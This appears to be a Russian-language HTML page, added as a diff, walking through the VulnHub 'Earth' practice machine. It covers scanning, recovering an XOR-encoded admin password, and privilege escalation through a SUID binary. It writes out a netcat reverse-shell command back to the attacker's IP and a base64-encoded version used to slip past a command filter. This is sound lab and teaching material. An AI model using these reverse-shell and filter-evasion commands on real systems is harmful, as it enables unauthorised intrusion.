@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width initial-scale=1.0">
+        <link rel="stylesheet" href="styles.css">
+        <title>Earth</title>
+    </head>
+    <body>
+        <header>
+            <div class="header-container">
+                <h1><a href="https://vulnhub.com/">VulnHub</a></h1>
+                <div class="navigation">
+                    <ul>
+                        <li><a href="index.html">Главная</a></li>
+                        <li><a href="breakout.html">BreakOut</a></li>
+                        <li><a href="lupinone.html">LupinOne</a></li>
+                        <li><a href="jangow.html">Jangow</a></li>
+                        <li><a href="mercury.html">Mercury</a></li>
+                        <li><a href="venus.html">Venus</a></li>
+                        <li><a href="earth.html">Earth</a></li>
+                    </ul>
+                </div>
+            </div>
+        </header>
+        <main>
+            <div class="text-container">
+                <h2>Краткая информация</h2>
+                <p>
+                    <b><a href="https://vulnhub.com/entry/the-planets-earth,755/" target="_blank">Earth</a></b> — это виртуальная машина, предназначенная для новичков. Целью машины является отработка и развитие навыков у начинающих экспертов в области безопасности.
+                    Учебная машина является частью серии машин "The planets", разработанной SirFlash. Она отлично подходит для новичков.
+                </p>
+                <h2>Прохождение</h2>
+                <p>
+                    &emsp;&emsp;Прохождение начинается с разведки. Я знаю IP адрес своей виртуальной машины Kali Linux (его можно узнать с помощью команды "ifconfig eth0"). <b>Мой IP адрес: 10.0.2.6</b>
+                    <br>&emsp;&emsp;С помощью команды "<b>sudo netdiscover -r 10.0.2.6</b>" я узнал обо всех устройствах в моей сети (уязвимая машина должна быть в одной сети с машиной атакующего, а то ничего не получится).
+                    <img src="images/Earth/ipaddress.png" alt="Ip address" width="800" height="500">
+                    <br>&emsp;&emsp;Мое внимание привлекли два последних Ip адреса, так как они расположены в виртуальной среде, как и уязвимая машина. Проанализировав, все устройства моего Virtual Box, я понял, что <b>Ip адрес цели: 10.0.2.13</b>
+                </p>
+                <p>
+                    &emsp;&emsp;Я знаю IP адрес цели и могу перейти к сканированию. Для начала найдем все открытые порты, для этой цели использую nmap (далее я предполагаю, что читатель знаком с базовыми инструментами для проведения пентеста).
+                    <br>&emsp;&emsp;Использую команду "<b>sudo nmap -sV -vvv -p- -O -oA FirstNmapScan 10.0.2.13</b>" и получаю результат:<br>
+                    <img src="images/Earth/nmap.png" alt="NmapScan" width="800" height="500">
+                    <br>&emsp;&emsp;&emsp;Исходя из работы nmap, я делаю следующие выводы:
+                    <ol>
+                        <li>MAC адрес: 08:00:27:23:63:BC (Oracle VirtualBox virtual NIC) ;</li>
+                        <li>ОС цели: Linux 4.15 - 5.8, Fedora;</li>
+                        <li>
+                            <b>Открытые порты и их службы:
+                            <ol>
+                                <li>22/tcp ssh OpenSSH 8.6 (protocol 2.0) ;</li>
+                                <li>80/tcp http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9);</li>
+                                <li>443/tcp ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9).</li>
+                            </ol>
+                            </b>
+                        </li>
+                        <li>
+                            Работающие приложения:
+                            <ul>
+                                <li>Python 3.9;</li>
+                                <li>Apache httpd 2.4.51;</li>
+                                <li>ssh.</li>
+                            </ul>
+                        </li>
+                    </ol>
+                </p>
+                <p>
+                    &emsp;&emsp;Далее я решил проверить, какие службы запущены на открытых портах. Я пробовал запустить их в firefox:
+                    <br>&emsp;&emsp;Порт 80 выдал мне веб-сайт с ошибкой:
+                    <br><img src="images/Earth/port80.png" alt="Port80" width="800" height="500">
+                    <br>&emsp;&emsp;Порт 443 выдал тестовую страницу сервера:
+                    <br><img src="images/Earth/port443.png" alt="Port443" width="800" height="500">
+                    <br>&emsp;&emsp;Анализ исходного кода полезных данных не дал, файл "robots.txt" отсутствует.
+                </p>
+                <p>
+                    &emsp;&emsp;Такие инструменты, как goubester, ffuf, dirb скрытых директорий не нашли.В надежде найти хоть какие-то полезные данные
+                    я запустил дополнительное сканирование nmap, но полезной информации не получил.Пока ждал конца сканирования, решил взглярнуть на сертификаты на странице
+                    "https://10.0.2.13:443" и кое что нашел:
+                    <br><img src="images/Earth/address.png" alt="Address" width="800" height="500">
+                    <br><img src="images/Earth/subdomain.png" alt="SubDomain" width="800" height="500">
+                    <br>&emsp;&emsp;Да, это целых <b>две страницы</b>!!!Моим следующим шагом было добавление найденых доменов в файл "<b>/etc/hosts</b>":
+                    <br><img src="images/Earth/hosts.png" alt="Hosts" width="800" height="500">
+                </p>
+                <p>
+                    &emsp;&emsp;Самое время зайти на страницы:
+                    <br><img src="images/Earth/earth_local.png" alt="EarthLocal" width="800" height="500">
+                    <br><img src="images/Earth/terratest_earth_local.png" alt="TerratestEarthLocal" width="800" height="500">
+                    <br>&emsp;&emsp;Перехожу к анализу веб-страниц:
+                    <ol>Страница "http://earth.local/":
+                        <li>Исходный код подсказок не дал;</li>
+                        <li>Файл "robots.txt" отсутствует;</li>
+                        <li>Найдена директория "admin" (использую инструмент ffuf и словарь seclists/Discovery/Web-content/discovery-list-2.3-medium.txt).</li>
+                        <br><img src="images/Earth/admin_page.png" alt="AdminPage" width="800" height="500">
+                    </ol>
+                    <ol>Страница "https://terratest.earth.local/":
+                        <li>Исходный код подсказок не дал;</li>
+                        <li>Поиск директорий провалился;</li>
+                        <li><b>Файл "robots.txt" присутвсвует:</b></li>
+                        <br><img src="images/Earth/terratest_robots.png" alt="TerratestRobots" width="800" height="500">
+                    </ol>
+                </p>
+                <p>
+                    <ol>&emsp;&emsp;C помощью файла "testingnotes.txt", ссылка на который была в "robots.txt" я узнал много полезной информации:
+                        <li><b>Имя админа - terra</b>;</li> 
+                        <li><b>Дополнительный файл - testdata.txt</b>;</li> 
+                        <li><b>Способ шифрования - XOR</b>;</li>
+                        <li>Файл testdata.txt используется как ключ, согласно файлу.</li>
+                    </ol>
+                    <img src="images/Earth/robots.png" alt="RobotsResults" width="800" height="500">
+                </p>
+                <p>
+                    &emsp;&emsp;Все это время я хотел посмотреть на эти символы внизу формы ввода на странице "http://earth.local".
+                    <br>У меня есть предполагаемый ключ.Захожу в CyberChef:
+                    <img src="images/Earth/symbols.png" alt="Symbols" width="800" height="500">
+                    <img src="images/Earth/password.png" alt="Password" width="800" height="500">
+                    <br>&emsp;&emsp;Комбинация "earthclimatechangebad4humans" повторяется и, возможно, является паролем. Пробую войти в административную панель под данными: <b>terra</b> -- <b>earthclimatechangebad4humans</b>. 
+                    Я получил доступ к административной панели и терминалу. Посидев и поизучав систему, понял, что пользователь, под которым я зашел, имеет крайне низкие права и привелегии. Попробую получить реверс шелл. 
+                    На своей машине я ввел команду "<b>nc -nlvp 1234</b>", в web-терминале - "<b>nc 10.0.2.6 1234 -e /bin/bash</b>". Потерпел неудачу, так как удаленные подключения запрещены.
+                    В данной ситуации свмым логичным шагом будет кодировка команды. Используя онлайн-кодировщик, я закодировал  команду  "nc 10.0.2.6 1234 -e /bin/bash" и усовершенствовал её. 
+                    Введя команду '<b>echo "bmMgMTAuMC4yLjYgMTIzNCAtZSAvYmluL2Jhc2g=" | base64 -d | bash</b>' в web-терминал, я получил реверс шелл:
+                    <img src="images/Earth/decode_shell.png" alt="Shell" width="800" height="500">
+                </p>
+                <p>
+                    &emsp;&emsp;Далее я изучаю систему и перехожу и повышению привелегий.<br>
+                    <ol>Полученные данные:
+                        <li>История пуста;</li>
+                        <li>История bash не записывалась;</li>
+                        <li>Я не могу использовать команду sudo;</li>
+                        <li><b>SUID биты:</b></li>
+                        <img src="images/Earth/suid.png" alt="SUID" width="800" height="500">
+                    </ol>
+                    &emsp;&emsp;Мое внимание привлек "/usr/bin/reset_root": я раньше с этим не сталкивался, да и название "говорящее". В базе gtfobins.github.io этого бита нет. Перехожу к исследованию этого бита. Результаты исследования:
+                    <img src="images/Earth/reset_root_results.png" alt="Result" width="800" height="500">
+                    <br>&emsp;&emsp;Я хочу поэксперементировать с этим файлом на своей машине, поэтому перебрасываю его, используя команду "ncat 10.0.2.6 < /usr/bin/reset_root". На своей машине я анализирую файл с помощью библиотеки ltrace: 
+                    <img src="images/Earth/ltrace_analis.png" alt="Ltrace" width="800" height="500">
+                    <br>&emsp;&emsp;На целевой машине нет нужных триггеров. Я добавлю их вручную (в роли триггеров выступают директории). После добавления триггеров я получаю <b>пароль от root</b>:
+                    <br><img src="images/Earth/root.png" alt="Root" width="800" height="500">
+                    <br>&emsp;&emsp;Воспользовавшись <b>утилитой find я нашел флаги</b>:
+                    <img src="images/Earth/flags.png" alt="Find" width="800" height="500">
+                </p>
+                <p>
+                    <h2>Заключение</h2>
+                    &emsp;&emsp;Уязвимая машина Earth отлично подходит для начинающих специалистов по безопасности. Я очень благодарен тебе, читатель, за то, что уделил внимание моему труду. Подробнее с результатами сканирований можно ознакомиться <a href="https://github.com/whitecar1/VulnHub">здесь</a>.
+                    Так же я был бы непротив конструктивной критики. Ведь, как говориться,все мы чему-то учимся. Спасибо за внимание!!!
+                </p>
+            </div>
+        </main>
+        <footer>
+            <p>&copy;2024 VulnHub. WhiteCar</p>
+        </footer>
+        <script src="script.ls"></script>
+    </body>
+</html>
